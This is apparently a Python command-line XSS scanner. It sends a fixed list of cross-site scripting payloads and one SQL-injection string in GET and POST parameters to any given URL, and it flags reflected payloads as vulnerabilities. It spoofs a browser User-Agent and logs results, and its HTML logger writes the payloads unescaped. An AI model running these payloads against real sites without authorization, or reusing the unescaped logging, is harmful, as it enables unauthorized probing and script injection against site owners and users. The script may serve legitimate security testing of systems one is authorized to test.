import requests
import csv
import argparse
from datetime import datetime
from termcolor import colored

def check_xss(url, method, payload, headers=None):
    if method.upper() == "GET":
        response = requests.get(url, params={"q": payload}, headers=headers)
    elif method.upper() == "POST":
        response = requests.post(url, data={"q": payload}, headers=headers)
    else:
        print("Unsupported HTTP method")
        return None

    return response

def log_result(log_file, message, csv_log=False, html_log=False):
    if csv_log:
        with open(log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(message)
    elif html_log:
        with open(log_file, 'a') as f:
            f.write(f"<tr><td>{'</td><td>'.join(message)}</td></tr>\n")
    else:
        with open(log_file, 'a') as f:
            f.write(' | '.join(message) + "\n")  # Ensure message is a string

def main(url, log_file, csv_log=False, html_log=False):
    payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><iframe src=javascript:alert(1)>",
        "javascript:alert(1)//",
        "<body onload=alert(1)>",
        "' OR '1'='1';--"
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    for payload in payloads:
        for method in ["GET", "POST"]:
            response = check_xss(url, method, payload, headers)

            if response is None:
                continue

            status_code = response.status_code
            content_length = len(response.content)
            headers_info = response.headers

            if payload in response.text:
                result = (
                    colored(f"[+] XSS vulnerability found at: {url}", "red", attrs=["bold"]) + 
                    f"\n   Method: {method} | Payload: {colored(payload, 'yellow', attrs=['bold'])}" +
                    f"\n   Status Code: {colored(status_code, 'green')}" +
                    f"\n   Content-Length: {content_length} bytes" +
                    f"\n   Response Headers: {headers_info}\n"
                )
                print(result)
                
                log_result(log_file, [url, method, payload, "Vulnerable", datetime.now().isoformat(), str(status_code), str(content_length)], csv_log, html_log)
            else:
                print(f"[-] No XSS vulnerability found at: {url} using {method} with payload: {payload}")
                print(f"   Status Code: {status_code}\n   Content-Length: {content_length} bytes\n   Response Headers: {headers_info}")

    print(colored("Testing complete.", "blue"))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    parser.add_argument('--url', required=True, help='Target URL to scan for XSS vulnerabilities')
    parser.add_argument('--log', default='xss_scan_log.txt', help='Log file to save results')
    parser.add_argument('--csv', action='store_true', help='Enable CSV logging')
    parser.add_argument('--html', action='store_true', help='Enable HTML logging')

    args = parser.parse_args()

    main(args.url, args.log, args.csv, args.html)
